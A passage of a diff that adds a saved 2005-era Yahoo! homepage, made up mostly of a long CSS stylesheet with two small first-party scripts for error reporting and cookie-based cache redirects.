@@ -1,0 +1,2272 @@
+﻿<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
+<!-- saved from url=(0021)http://www.yahoo.com/ -->
+<HTML><HEAD><TITLE>Yahoo!</TITLE>
+<SCRIPT language=javascript>
+var now=new Date,t1=0,t2=0,t3=0,t4=0,t5=0,t6=0,hp=0,cc='',ylp='';t1=now.getTime();
+function err(a,b,c) {
+var img=new Image;
+img.src='http://srd.yahoo.com/hp5-err/'+escape(a)+','+escape(b)+','+escape(c)+'/*1';
+return true;
+}
+window.onerror=err;
+</SCRIPT>
+
+<META http-equiv=Content-Type content="text/html; charset=UTF-8">
+<META http-equiv=PICS-Label 
+content='(PICS-1.1 "http://www.icra.org/ratingsv02.html" l r (cz 1 lz 1 nz 1 oz 1 vz 1) gen true for "http://www.yahoo.com" r (cz 1 lz 1 nz 1 oz 1 vz 1) "http://www.rsac.org/ratingsv01.html" l r (n 0 s 0 v 0 l 0) gen true for "http://www.yahoo.com" r (n 0 s 0 v 0 l 0))'>
+<SCRIPT language=javascript><!--
+lck='',sss=1118767571,ylp='p.gif?t=1118767571&_ylp=A9htdkzTCa9C29EAK1z1cSkA',_lcs='';
+--></SCRIPT>
+
+<SCRIPT language=javascript>
+var b,d,l='',n='0',r,s,y;
+y=' '+document.cookie+';';
+if ((b=y.indexOf(' Y=v'))>=0) {
+y=y.substring(b,y.indexOf(';',b))+'&';
+if ((b=y.indexOf('l='))>=0) {
+l=y.substring(b+2,y.indexOf('&',b));
+if((b=y.indexOf('n='))>=0)n=y.substring(b+2,y.indexOf('&',b));
+}
+}
+d=new Date();
+s=Math.round(d.getTime()/1000);
+r=Math.round(parseInt(n,32)%1021);
+if (lck!=l) {
+document.write('<meta http-equiv="Expires" content="-1">');
+if (location.search.indexOf('r'+r+'=')!=1) {
+location.replace('http://'+location.hostname+location.pathname+'?r'+r+'='+s);
+}
+}
+</SCRIPT>
+
+<STYLE media=all>BODY {
+	FONT: 84%/1.2em arial,sans-serif; DIRECTION: ltr
+}
+.s {
+	CURSOR: hand
+}
+.s2 {
+	CURSOR: hand
+}
+LABEL {
+	CURSOR: hand
+}
+#ss LABEL {
+	CURSOR: auto
+}
+.np {
+	CURSOR: auto
+}
+.s {
+	BORDER-RIGHT: #be9a27 1px solid; BORDER-TOP: #be9a27 1px solid; BACKGROUND: #f7dc88; BORDER-LEFT: #be9a27 1px solid; COLOR: #630; BORDER-BOTTOM: #be9a27 1px solid
+}
+.s3 {
+	BORDER-RIGHT: #be9a27 1px solid; BORDER-TOP: #be9a27 1px solid; BACKGROUND: #f7dc88; BORDER-LEFT: #be9a27 1px solid; COLOR: #630; BORDER-BOTTOM: #be9a27 1px solid
+}
+.s2 {
+	BACKGROUND: #ddd
+}
+EM {
+	FONT-STYLE: normal
+}
+.b {
+	BACKGROUND: none transparent scroll repeat 0% 0%
+}
+#yl {
+	TEXT-ALIGN: center
+}
+#t {
+	TEXT-ALIGN: center
+}
+#m SPAN {
+	TEXT-ALIGN: center
+}
+BODY {
+	TEXT-ALIGN: center
+}
+#c {
+	TEXT-ALIGN: right
+}
+#sw {
+	TEXT-ALIGN: right
+}
+.n {
+	TEXT-ALIGN: right
+}
+#t TABLE {
+	MARGIN: 0px auto
+}
+#m H1 IMG {
+	MARGIN: 0px auto
+}
+#m SPAN IMG {
+	MARGIN: 0px auto
+}
+#i {
+	MARGIN: 0px auto
+}
+#dc {
+	MARGIN: 0px auto
+}
+#fs {
+	BORDER-RIGHT: 0px; BORDER-TOP: 0px; BORDER-LEFT: 0px; BORDER-BOTTOM: 0px
+}
+IMG {
+	BORDER-RIGHT: 0px; BORDER-TOP: 0px; BORDER-LEFT: 0px; BORDER-BOTTOM: 0px
+}
+#fs {
+	PADDING-RIGHT: 0px; PADDING-LEFT: 0px; PADDING-BOTTOM: 0px; PADDING-TOP: 0px
+}
+HR {
+	PADDING-RIGHT: 0px; PADDING-LEFT: 0px; PADDING-BOTTOM: 0px; PADDING-TOP: 0px
+}
+#w H2 .m {
+	MARGIN: 0px
+}
+#fs {
+	MARGIN: 0px
+}
+#yb {
+	MARGIN: 0px
+}
+#yf {
+	MARGIN: 0px
+}
+BODY {
+	MARGIN: 0px
+}
+P {
+	MARGIN: 0px
+}
+HR {
+	MARGIN: 0px
+}
+UL {
+	MARGIN: 0px
+}
+OL {
+	MARGIN: 0px
+}
+FORM {
+	MARGIN: 0px
+}
+H1 {
+	MARGIN: 0px
+}
+H2 {
+	MARGIN: 0px
+}
+H3 {
+	MARGIN: 0px
+}
+H4 {
+	MARGIN: 0px
+}
+H5 {
+	MARGIN: 0px
+}
+.mr {
+	DISPLAY: block
+}
+#ls A {
+	DISPLAY: block
+}
+#wa SPAN {
+	DISPLAY: block
+}
+HR {
+	DISPLAY: block
+}
+spacer {
+	DISPLAY: block
+}
+.wa {
+	DISPLAY: block
+}
+CITE {
+	DISPLAY: block
+}
+.q A {
+	DISPLAY: block
+}
+.q2 A {
+	DISPLAY: block
+}
+.b A {
+	DISPLAY: block
+}
+.d A {
+	DISPLAY: block
+}
+.u A {
+	DISPLAY: block
+}
+#m IMG {
+	DISPLAY: block
+}
+#m BR {
+	DISPLAY: none
+}
+#v {
+	DISPLAY: none
+}
+#h {
+	DISPLAY: none
+}
+#hm {
+	DISPLAY: none
+}
+#tb {
+	DISPLAY: none
+}
+#ca {
+	DISPLAY: none
+}
+#ex {
+	DISPLAY: none
+}
+.so IMG {
+	POSITION: relative
+}
+#ld A {
+	POSITION: relative
+}
+.si .m A {
+	POSITION: relative
+}
+SELECT {
+	POSITION: relative
+}
+#v {
+	POSITION: relative
+}
+#w {
+	POSITION: relative
+}
+#ca {
+	POSITION: relative
+}
+.ps {
+	POSITION: relative
+}
+#m {
+	POSITION: relative
+}
+#v A {
+	POSITION: relative
+}
+#st {
+	POSITION: relative
+}
+#yl {
+	POSITION: absolute
+}
+#v .h B {
+	POSITION: absolute
+}
+#m SPAN {
+	POSITION: absolute
+}
+#md {
+	POSITION: absolute
+}
+#mt {
+	POSITION: static
+}
+.n {
+	FLOAT: none
+}
+.so IMG {
+	FLOAT: left
+}
+#ca {
+	FLOAT: left
+}
+#g .m {
+	FLOAT: left
+}
+#z {
+	FLOAT: left
+}
+#ws {
+	FLOAT: left
+}
+#yb {
+	FLOAT: left
+}
+#w .b IMG {
+	FLOAT: left
+}
+#c1 {
+	FLOAT: left
+}
+.u {
+	FLOAT: left
+}
+.b {
+	FLOAT: left
+}
+.d {
+	FLOAT: left
+}
+.q {
+	FLOAT: left
+}
+.q2 {
+	FLOAT: left
+}
+.x {
+	FLOAT: left
+}
+#c {
+	FLOAT: left
+}
+#v EM {
+	FLOAT: left
+}
+#v A {
+	FLOAT: left
+}
+#hm {
+	FLOAT: left
+}
+.f {
+	FLOAT: left
+}
+#c2 {
+	FLOAT: right
+}
+.m {
+	FLOAT: right
+}
+#yf {
+	FLOAT: right
+}
+.mr {
+	CLEAR: both
+}
+#z {
+	CLEAR: both
+}
+.wa {
+	CLEAR: both
+}
+#w {
+	CLEAR: both
+}
+#e {
+	CLEAR: both
+}
+#m {
+	CLEAR: both
+}
+.hr {
+	CLEAR: both
+}
+.c {
+	CLEAR: both
+}
+.cl {
+	CLEAR: both
+}
+HR {
+	BORDER-RIGHT: #ccc 0px solid; BORDER-TOP: #ccc 0px solid; MARGIN: 4px 0px; BORDER-LEFT: #ccc 0px solid; BORDER-BOTTOM: #ccc 1px solid; HEIGHT: 1px
+}
+.nw {
+	VERTICAL-ALIGN: top
+}
+#dc {
+	WIDTH: 56.4em; TEXT-ALIGN: left; min-width: 760px
+}
+#c1 {
+	WIDTH: 58%; min-width: 440px
+}
+#c2 {
+	WIDTH: 42%; min-width: 300px
+}
+#yb {
+	WIDTH: 48.45%; min-width: 213px
+}
+#yf {
+	WIDTH: 48.45%; min-width: 213px
+}
+#mm {
+	HEIGHT: 5.3em
+}
+#em {
+	MARGIN-LEFT: 19px
+}
+#n {
+	MARGIN-LEFT: 19px
+}
+#w {
+	MARGIN-LEFT: 19px
+}
+#k {
+	MARGIN-LEFT: 19px
+}
+#g {
+	MARGIN-LEFT: 19px
+}
+#tg {
+	MARGIN-LEFT: 19px
+}
+#h {
+	PADDING-RIGHT: 10px; PADDING-LEFT: 10px; BACKGROUND: #f2f2f2; PADDING-BOTTOM: 2px; PADDING-TOP: 2px; BORDER-BOTTOM: #d9d9d9 1px solid
+}
+#md {
+	BORDER-RIGHT: #cecece 1px solid; BORDER-TOP: #cecece 1px solid; Z-INDEX: 110; LEFT: 0px; BORDER-LEFT: #cecece 1px solid; BORDER-BOTTOM: #cecece 1px solid; TOP: 0px
+}
+#md A {
+	PADDING-RIGHT: 2px; PADDING-LEFT: 1px; PADDING-BOTTOM: 0px; PADDING-TOP: 0px
+}
+#m {
+	MARGIN: 10px 0px; HEIGHT: 52px
+}
+#m SPAN {
+	WIDTH: 80px; LINE-HEIGHT: 77%
+}
+#w .ct .f {
+	WHITE-SPACE: nowrap
+}
+#mt .m FORM {
+	WHITE-SPACE: nowrap
+}
+#m SPAN A {
+	WHITE-SPACE: nowrap
+}
+#m SPAN IMG {
+	MARGIN-BOTTOM: 3px; WIDTH: 36px; HEIGHT: 36px
+}
+#m1 {
+	LEFT: 1.6em
+}
+#m2 {
+	LEFT: 7.65em
+}
+#m3 {
+	LEFT: 13.65em
+}
+#m4 {
+	RIGHT: 13.65em
+}
+#m5 {
+	RIGHT: 7.65em
+}
+#m6 {
+	RIGHT: 1.6em
+}
+#v {
+	BORDER-RIGHT: #cfcfcf 1px solid; BORDER-TOP: #cfcfcf 1px solid; Z-INDEX: 5; MARGIN-BOTTOM: -1px; BORDER-LEFT: #cfcfcf 1px solid; COLOR: #999; BORDER-BOTTOM: #cfcfcf 0px solid; HEIGHT: 1.5em
+}
+#v EM {
+	FONT-SIZE: 84%; BACKGROUND: #989898; MARGIN: 2px 0px; WIDTH: 1px; HEIGHT: 1.25em
+}
+#v A {
+	PADDING-RIGHT: 7px; PADDING-LEFT: 7px; PADDING-BOTTOM: 2px; PADDING-TOP: 1px
+}
+#v .o:hover {
+	BACKGROUND: #eee
+}
+#md A {
+	TEXT-DECORATION: none
+}
+#v .h:hover {
+	TEXT-DECORATION: none
+}
+#v .h {
+	BORDER-RIGHT: #054576 1px solid; PADDING-RIGHT: 6px; BORDER-TOP: #054576 1px solid; PADDING-LEFT: 6px; FONT-WEIGHT: bold; BACKGROUND: #0075eb; PADDING-BOTTOM: 2px; MARGIN: -3px 0px 0px; BORDER-LEFT: #054576 1px solid; PADDING-TOP: 3px; BORDER-BOTTOM: #054576 1px solid
+}
+#v .h B {
+	MARGIN: 1.35em 0px 0px 0.65em; WIDTH: 11px; HEIGHT: 11px; BACKGROUND-COLOR: transparent
+}
+.v1 #ss {
+	BORDER-RIGHT: #75a3ed 1px solid; BORDER-TOP: #75a3ed 1px solid; BACKGROUND: #d2e4fc; BORDER-LEFT: #75a3ed 1px solid; BORDER-BOTTOM: #75a3ed 1px solid
+}
+.v1 #v .h B {
+	BACKGROUND: url(http://us.i1.yimg.com/us.yimg.com/i/us/nt/gr/search/tri_web2.gif) no-repeat
+}
+.v2 #ss {
+	BORDER-RIGHT: #ed7575 1px solid; BORDER-TOP: #ed7575 1px solid; BACKGROUND: #fcd2d2; BORDER-LEFT: #ed7575 1px solid; BORDER-BOTTOM: #ed7575 1px solid
+}
+.v2 #v .h {
+	BORDER-LEFT-COLOR: #662626; BACKGROUND: #a10303; BORDER-BOTTOM-COLOR: #662626; BORDER-TOP-COLOR: #662626; BORDER-RIGHT-COLOR: #662626
+}
+.v2 #v .h B {
+	BACKGROUND: url(http://us.i1.yimg.com/us.yimg.com/i/us/nt/gr/search/tri_img2.gif) no-repeat; MARGIN-LEFT: 1.15em
+}
+.v3 #ss {
+	BORDER-RIGHT: #b863b4 1px solid; BORDER-TOP: #b863b4 1px solid; BACKGROUND: #f9d3fa; BORDER-LEFT: #b863b4 1px solid; BORDER-BOTTOM: #b863b4 1px solid
+}
+.v3 #v .h {
+	BORDER-LEFT-COLOR: #760473; BACKGROUND: #b01faa; BORDER-BOTTOM-COLOR: #760473; BORDER-TOP-COLOR: #760473; BORDER-RIGHT-COLOR: #760473
+}
+.v3 #v .h B {
+	BACKGROUND: url(http://us.i1.yimg.com/us.yimg.com/i/ww/tri_web3.gif) no-repeat; MARGIN-LEFT: 1em
+}
+.v4 #ss {
+	BORDER-RIGHT: #d9681a 1px solid; BORDER-TOP: #d9681a 1px solid; BACKGROUND: #fce8d2; BORDER-LEFT: #d9681a 1px solid; BORDER-BOTTOM: #d9681a 1px solid
+}
+.v4 #v .h {
+	BORDER-LEFT-COLOR: #96450c; BACKGROUND: #d95000; BORDER-BOTTOM-COLOR: #96450c; BORDER-TOP-COLOR: #96450c; BORDER-RIGHT-COLOR: #96450c
+}
+.v4 #v .h B {
+	BACKGROUND: url(http://us.i1.yimg.com/us.yimg.com/i/us/nt/gr/search/tri_dir2.gif) no-repeat; MARGIN-LEFT: 1.6em
+}
+.v5 #ss {
+	BORDER-RIGHT: #ec9e2e 1px solid; BORDER-TOP: #ec9e2e 1px solid; BACKGROUND: #fcebb9; BORDER-LEFT: #ec9e2e 1px solid; BORDER-BOTTOM: #ec9e2e 1px solid
+}
+.v5 #v .h {
+	BORDER-LEFT-COLOR: #b28b12; BACKGROUND: #ec9e2e; BORDER-BOTTOM-COLOR: #b28b12; BORDER-TOP-COLOR: #b28b12; BORDER-RIGHT-COLOR: #b28b12
+}
+.v5 #v .h B {
+	BACKGROUND: url(http://us.i1.yimg.com/us.yimg.com/i/us/nt/gr/search/tri_yp3.gif) no-repeat; MARGIN-LEFT: 1em
+}
+.v5 #ss {
+	PADDING-RIGHT: 0px; PADDING-LEFT: 0px; PADDING-BOTTOM: 2px; PADDING-TOP: 9px
+}
+.v5 #ip {
+	MARGIN-TOP: -7px
+}
+.v5 #sw {
+	PADDING-TOP: 0.6em
+}
+.v5 #sn {
+	PADDING-TOP: 0.4em
+}
+#in {
+	PADDING-TOP: 1.1em
+}
+.v6 #ss {
+	BORDER-RIGHT: #9b72cf 1px solid; BORDER-TOP: #9b72cf 1px solid; BACKGROUND: #e2defc; BORDER-LEFT: #9b72cf 1px solid; BORDER-BOTTOM: #9b72cf 1px solid
+}
+.v6 #v .h {
+	BORDER-LEFT-COLOR: #16165e; BACKGROUND: #501fb2; BORDER-BOTTOM-COLOR: #16165e; BORDER-TOP-COLOR: #16165e; BORDER-RIGHT-COLOR: #16165e
+}
+.v6 #v .h B {
+	BACKGROUND: url(http://us.i1.yimg.com/us.yimg.com/i/us/nt/gr/search/tri_news2.gif) no-repeat; MARGIN-LEFT: 0.85em
+}
+.v7 #ss {
+	BORDER-RIGHT: #9fbe4c 1px solid; BORDER-TOP: #9fbe4c 1px solid; BACKGROUND: #eefcd2; BORDER-LEFT: #9fbe4c 1px solid; BORDER-BOTTOM: #9fbe4c 1px solid
+}
+.v7 #v .h {
+	BORDER-LEFT-COLOR: #3d4c14; BACKGROUND: #549400; BORDER-BOTTOM-COLOR: #3d4c14; BORDER-TOP-COLOR: #3d4c14; BORDER-RIGHT-COLOR: #3d4c14
+}
+.v7 #v .h B {
+	BACKGROUND: url(http://us.i1.yimg.com/us.yimg.com/i/us/nt/gr/search/tri_prod2.gif) no-repeat; MARGIN-LEFT: 1.6em
+}
+#c {
+	WIDTH: 13.1em
+}
+.so .m {
+	MARGIN-TOP: -1px
+}
+#st {
+	MARGIN-TOP: 1px
+}
+.nw {
+	MARGIN-TOP: 2px
+}
+H2 .m {
+	MARGIN-TOP: 2px
+}
+#ca {
+	MARGIN-TOP: 2px
+}
+H4 {
+	MARGIN-TOP: 2px
+}
+#c {
+	MARGIN-TOP: 3px
+}
+#f {
+	MARGIN-TOP: 4px
+}
+#w .ct .f {
+	MARGIN-TOP: 4px
+}
+#mt .f {
+	MARGIN-TOP: 4px
+}
+#ws {
+	MARGIN-TOP: 9px
+}
+#ss SPAN.f {
+	MARGIN-RIGHT: 10px
+}
+.ct .f {
+	MARGIN-RIGHT: 10px
+}
+#c {
+	MARGIN-RIGHT: 10px
+}
+#mm {
+	MARGIN-BOTTOM: 10px
+}
+#y {
+	MARGIN-BOTTOM: 10px
+}
+#wm {
+	MARGIN-BOTTOM: 10px
+}
+#e {
+	MARGIN-BOTTOM: 10px
+}
+#eb {
+	MARGIN-BOTTOM: 10px
+}
+#b {
+	MARGIN-BOTTOM: 10px
+}
+#wd {
+	MARGIN-BOTTOM: 10px
+}
+#mo {
+	MARGIN-BOTTOM: 10px
+}
+#em {
+	MARGIN-BOTTOM: 10px
+}
+#n {
+	MARGIN-BOTTOM: 10px
+}
+#w {
+	MARGIN-BOTTOM: 10px
+}
+#k {
+	MARGIN-BOTTOM: 10px
+}
+#g {
+	MARGIN-BOTTOM: 10px
+}
+#tg {
+	MARGIN-BOTTOM: 10px
+}
+#wa SPAN {
+	MARGIN-BOTTOM: 5px
+}
+#ls .mr {
+	PADDING-BOTTOM: 5px
+}
+#sw {
+	PADDING-TOP: 3px
+}
+#w .mr {
+	PADDING-TOP: 5px
+}
+#g .m {
+	PADDING-TOP: 5px
+}
+#ls .mr {
+	PADDING-TOP: 0px
+}
+.so .m {
+	PADDING-TOP: 1px
+}
+#ss {
+	BORDER-RIGHT: #99b9e3 1px solid; PADDING-RIGHT: 0px; BORDER-TOP: #99b9e3 1px solid; PADDING-LEFT: 0px; BACKGROUND: #d2e4fc; PADDING-BOTTOM: 8px; BORDER-LEFT: #99b9e3 1px solid; PADDING-TOP: 8px; BORDER-BOTTOM: #99b9e3 1px solid
+}
+#sw {
+	WIDTH: 10em
+}
+#ld {
+	WIDTH: 7em; LINE-HEIGHT: 0.9em; HEIGHT: 1.8em
+}
+#ss #bss {
+	WIDTH: 42%
+}
+#ss #acs {
+	WIDTH: 48%; MARGIN-RIGHT: 0px
+}
+#yl {
+	WIDTH: 100%
+}
+#fp {
+	WIDTH: 100%
+}
+#csz {
+	WIDTH: 100%
+}
+#st {
+	WIDTH: 10em
+}
+#s {
+	MARGIN-BOTTOM: 7px
+}
+#t {
+	MARGIN-BOTTOM: 7px
+}
+.ct {
+	PADDING-RIGHT: 9px; PADDING-LEFT: 9px; PADDING-BOTTOM: 9px; PADDING-TOP: 9px
+}
+.u {
+	WIDTH: 25%
+}
+#ip {
+	WIDTH: 25%
+}
+.b {
+	WIDTH: 50%
+}
+.q {
+	WIDTH: 60%
+}
+#yb .ct {
+	PADDING-RIGHT: 5px; PADDING-LEFT: 9px; PADDING-BOTTOM: 9px; PADDING-TOP: 9px
+}
+.ybl {
+	WIDTH: 47.5%
+}
+.ybr {
+	WIDTH: 52.5%
+}
+H2 {
+	PADDING-RIGHT: 9px; PADDING-LEFT: 9px; BACKGROUND: #d2e4fc; PADDING-BOTTOM: 2px; PADDING-TOP: 1px
+}
+.l {
+	BORDER-RIGHT: #d2e4fc 1px solid; BORDER-TOP: #d2e4fc 1px solid; BORDER-LEFT: #d2e4fc 1px solid; BORDER-BOTTOM: #d2e4fc 1px solid
+}
+.r {
+	BORDER-RIGHT: #d2e4fc 1px solid; BORDER-TOP: #d2e4fc 1px solid; BORDER-LEFT: #d2e4fc 1px solid; BORDER-BOTTOM: #d2e4fc 1px solid
+}
+.r H2 {
+	BACKGROUND: #9b72cf
+}
+.r {
+	BORDER-LEFT-COLOR: #9b72cf; BORDER-BOTTOM-COLOR: #9b72cf; BORDER-TOP-COLOR: #9b72cf; BORDER-RIGHT-COLOR: #9b72cf
+}
+.r {
+	BACKGROUND-COLOR: #f1f1fd
+}
+.l {
+	BACKGROUND-COLOR: #fff
+}
+.l#y {
+	BORDER-RIGHT: 0px; BORDER-TOP: 0px; BORDER-LEFT: 0px; BORDER-BOTTOM: 0px
+}
+#y .ct {
+	BORDER-RIGHT: #d0e4fd 1px solid; BORDER-TOP: 0px; BACKGROUND: #f2f5f7; BORDER-LEFT: #d0e4fd 1px solid; BORDER-BOTTOM: #d0e4fd 1px solid
+}
+#y H2 {
+	BORDER-RIGHT: #d2e4fc 1px solid; PADDING-RIGHT: 9px; BORDER-TOP: #d2e4fc 1px solid; PADDING-LEFT: 9px; PADDING-BOTTOM: 1px; BORDER-LEFT: #d2e4fc 1px solid; PADDING-TOP: 1px; BORDER-BOTTOM: #d2e4fc 1px solid
+}
+#y H2.so {
+	BORDER-LEFT: 0px
+}
+#y .ct .mr {
+	MARGIN: 6px 0px 0px 3px
+}
+#y .u A {
+	LINE-HEIGHT: 1.15em
+}
+.ps {
+	TOP: -1px
+}
+#y .so .f {
+	WIDTH: auto
+}
+#y .so IMG {
+	LEFT: -1px; FLOAT: left; MARGIN: -7px 5px -3px -8px; POSITION: relative
+}
+.si EM {
+	MARGIN: 0px 2px
+}
+.si .m {
+	MARGIN-LEFT: -60px; PADDING-TOP: 2px; WHITE-SPACE: nowrap
+}
+.si .m #om {
+	PADDING-RIGHT: 0px; MARGIN-TOP: -3px; PADDING-LEFT: 31px; PADDING-BOTTOM: 2px; PADDING-TOP: 3px
+}
+.ym {
+	BACKGROUND: url(http://us.i1.yimg.com/us.yimg.com/i/us/pim/newmail1.gif) no-repeat 0px 0px
+}
+.nm {
+	BACKGROUND: url(http://us.i1.yimg.com/us.yimg.com/i/us/pim/nomail1.gif) no-repeat 0px 0px
+}
+.si SPAN {
+	MARGIN: 0px -2px; COLOR: #f60
+}
+.si .m B {
+	MARGIN: 0px
+}
+#n TD {
+	LINE-HEIGHT: 1.1em
+}
+#mt .s2 {
+	PADDING-RIGHT: 3px; PADDING-LEFT: 3px; PADDING-BOTTOM: 0px; PADDING-TOP: 0px
+}
+#w .s2 {
+	PADDING-RIGHT: 3px; PADDING-LEFT: 3px; PADDING-BOTTOM: 0px; PADDING-TOP: 0px
+}
+#tr {
+	PADDING-RIGHT: 0px; BORDER-TOP: #ddd 1px solid; MARGIN-TOP: 5px; PADDING-LEFT: 0px; PADDING-BOTTOM: 1px; PADDING-TOP: 2px
+}
+#nl {
+	PADDING-RIGHT: 0px; BORDER-TOP: #ddd 1px solid; MARGIN-TOP: 5px; PADDING-LEFT: 0px; PADDING-BOTTOM: 1px; PADDING-TOP: 2px
+}
+#mt {
+	PADDING-RIGHT: 0px; BORDER-TOP: #ddd 1px solid; MARGIN-TOP: 5px; PADDING-LEFT: 0px; PADDING-BOTTOM: 1px; PADDING-TOP: 2px
+}
+#nl {
+	PADDING-RIGHT: 0px; PADDING-LEFT: 0px; PADDING-BOTTOM: 0px; PADDING-TOP: 5px
+}
+#wf {
+	PADDING-RIGHT: 0px; PADDING-LEFT: 0px; PADDING-BOTTOM: 1px; MARGIN: 0px 0px 2px; PADDING-TOP: 0px
+}
+#tr {
+	PADDING-RIGHT: 0px; PADDING-LEFT: 0px; PADDING-BOTTOM: 0px; PADDING-TOP: 4px
+}
+#w H3 {
+	MARGIN: 0px 0px 4px
+}
+#tr H3 {
+	MARGIN-BOTTOM: 3px
+}
+#z {
+	PADDING-RIGHT: 5px; PADDING-LEFT: 45px; BACKGROUND: url(http://us.i1.yimg.com/us.yimg.com/i/ww/beta/wthr.gif) no-repeat 0px 0px; PADDING-BOTTOM: 5px; MARGIN: 5px 0px; WIDTH: 60%; PADDING-TOP: 5px
+}
+#w #wa {
+	BACKGROUND: none transparent scroll repeat 0% 0%; COLOR: #f00
+}
+#w SPAN.wa {
+	MARGIN: 0px
+}
+#w .r {
+	PADDING-RIGHT: 12px; PADDING-LEFT: 6px; BACKGROUND: url(http://us.i1.yimg.com/us.yimg.com/i/ww/cls.gif) #f1f1fd no-repeat 95% 50%; BORDER-BOTTOM-WIDTH: 0px; PADDING-BOTTOM: 6px; MARGIN: -5px -10px -5px 0px; WIDTH: 12.5em; PADDING-TOP: 4px
+}
+#z INPUT {
+	WIDTH: 100%
+}
+#w SELECT {
+	WIDTH: 100%
+}
+#ls {
+	BORDER-RIGHT: #ccc 1px solid; PADDING-RIGHT: 5px; BORDER-TOP: #ccc 1px solid; PADDING-LEFT: 5px; PADDING-BOTTOM: 5px; OVERFLOW: auto; BORDER-LEFT: #ccc 1px solid; PADDING-TOP: 5px; BORDER-BOTTOM: #ccc 1px solid; HEIGHT: 8em
+}
+.wil A {
+	MARGIN-LEFT: 5px
+}
+#f {
+	BORDER-TOP: #ccc 1px solid
+}
+#dc #y .s3 {
+	TEXT-DECORATION: none
+}
+A:link {
+	TEXT-DECORATION: none
+}
+A:visited {
+	TEXT-DECORATION: none
+}
+#y .so A {
+	TEXT-DECORATION: underline
+}
+A:hover {
+	TEXT-DECORATION: underline
+}
+.wil DIV {
+	FONT: bold 77% verdana
+}
+#w B {
+	FONT: bold 77% verdana
+}
+.mr {
+	FONT: bold 77% verdana
+}
+H4 {
+	FONT: bold 77% verdana
+}
+#hm {
+	FONT: bold 77% verdana
+}
+.m {
+	FONT: bold 77% verdana
+}
+.s {
+	FONT: bold 77% verdana
+}
+.s2 {
+	FONT: bold 77% verdana
+}
+.s3 {
+	FONT: bold 77% verdana
+}
+#nl {
+	FONT: bold 77% verdana
+}
+.si .m {
+	FONT: 77% verdana
+}
+.ef {
+	FONT: 77% verdana
+}
+#w .b A {
+	FONT: 77% verdana
+}
+#ip LABEL {
+	FONT: 77% verdana
+}
+#w .mr {
+	FONT: 77% verdana
+}
+#mt .f {
+	FONT: 77% verdana
+}
+.ps {
+	FONT: 77% verdana
+}
+#lc {
+	FONT: 77% verdana
+}
+OL {
+	FONT: 77% verdana
+}
+#m A {
+	FONT: 77% verdana
+}
+CITE {
+	FONT: 77% verdana
+}
+H3 {
+	FONT: bold 100% arial
+}
+#ls A {
+	FONT: bold 100% arial
+}
+#sw {
+	FONT: bold 100% arial
+}
+.so .m {
+	FONT: bold 100% arial
+}
+#c {
+	FONT: bold 100% arial
+}
+.hi {
+	FONT: bold 100% arial
+}
+.lo {
+	FONT: bold 100% arial
+}
+H2 {
+	FONT: bold 100% arial
+}
+.so .m {
+	FONT-WEIGHT: normal
+}
+.so .f {
+	FONT-WEIGHT: normal
+}
+#ls A {
+	FONT-WEIGHT: normal
+}
+#tb {
+	FONT-WEIGHT: normal
+}
+#n .m {
+	FONT-WEIGHT: normal
+}
+.si .m {
+	FONT-WEIGHT: normal
+}
+#c {
+	FONT-WEIGHT: normal
+}
+#i I {
+	FONT-WEIGHT: normal
+}
+#m IMG {
+	FONT-WEIGHT: normal
+}
+.so A {
+	FONT-WEIGHT: bold
+}
+#ls .mr {
+	FONT-WEIGHT: bold
+}
+#ld {
+	FONT-SIZE: 65%
+}
+.sc {
+	FONT-SIZE: 77%
+}
+#c {
+	FONT-SIZE: 77%
+}
+#i EM {
+	FONT-SIZE: 84%
+}
+#w .mr {
+	FONT-SIZE: 100%
+}
+#f {
+	FONT-SIZE: 100%
+}
+#w B {
+	FONT-SIZE: 100%
+}
+#n INPUT {
+	FONT-SIZE: 100%
+}
+#w .s2 {
+	FONT-SIZE: 100%
+}
+SELECT {
+	FONT-SIZE: 100%
+}
+INPUT {
+	FONT-SIZE: 100%
+}
+TEXTAREA {
+	FONT-SIZE: 100%
+}
+#tr A {
+	FONT-SIZE: 107%
+}
+#w .b A {
+	FONT-SIZE: 107%
+}
+.wil DIV {
+	FONT-SIZE: 115%
+}
+#ls A {
+	FONT-SIZE: 115%
+}
+#z {
+	FONT-SIZE: 115%
+}
+#w SELECT {
+	FONT-SIZE: 115%
+}
+.hi {
+	FONT-SIZE: 115%
+}
+.lo {
+	FONT-SIZE: 115%
+}
+#w H3 A {
+	FONT-SIZE: 129%
+}
+INPUT {
+	VERTICAL-ALIGN: middle
+}
+SELECT {
+	VERTICAL-ALIGN: middle
+}
+#ls DIV {
+	COLOR: #000
+}
+#y .f A {
+	COLOR: #000
+}
+#dc H2 .f {
+	COLOR: #000
+}
+#yb H2 A {
+	COLOR: #000
+}
+#yf H2 A {
+	COLOR: #000
+}
+#n CITE {
+	COLOR: #000
+}
+.s2 {
+	COLOR: #000
+}
+#w .f A {
+	COLOR: #fff
+}
+#v .h {
+	COLOR: #fff
+}
+#ca {
+	COLOR: #fff
+}
+#c2 H2 .f {
+	COLOR: #fff
+}
+#nw {
+	COLOR: #fff
+}
+#f {
+	COLOR: #666
+}
+#t {
+	COLOR: #666
+}
+#tg {
+	COLOR: #666
+}
+#y EM {
+	COLOR: #999
+}
+#c {
+	COLOR: #333
+}
+#m A {
+	COLOR: #333
+}
+#m IMG {
+	COLOR: #333
+}
+#md A {
+	COLOR: #6b6b6b
+}
+CITE {
+	COLOR: #636363
+}
+.up {
+	COLOR: #090
+}
+.dn {
+	COLOR: #d52d2d
+}
+.hi {
+	COLOR: #db8607
+}
+.lo {
+	COLOR: #8595a2
+}
+#y .so A {
+	COLOR: #039
+}
+.ef {
+	COLOR: #039
+}
+#w .ef A {
+	COLOR: #039
+}
+#w .r {
+	COLOR: #039
+}
+#v A {
+	COLOR: #039
+}
+#y H2.si .ps {
+	COLOR: #039
+}
+#y H2 .m A {
+	COLOR: #039
+}
+A:link {
+	COLOR: #039
+}
+A:hover {
+	COLOR: #0353a5
+}
+A:visited {
+	COLOR: #800080
+}
+.c {
+	FONT-SIZE: 1%
+}
+.lh {
+	LINE-HEIGHT: 92%
+}
+#y H2 {
+	BACKGROUND: #fff
+}
+#ls {
+	BACKGROUND: #fff
+}
+#v #e1 {
+	BACKGROUND: #fff
+}
+#dc #y .s3 {
+	PADDING-RIGHT: 7px; PADDING-LEFT: 7px; PADDING-BOTTOM: 1px; MARGIN-LEFT: 5px; COLOR: #630; PADDING-TOP: 1px
+}
+#b TABLE {
+	WIDTH: auto
+}
+#wf:unknown {
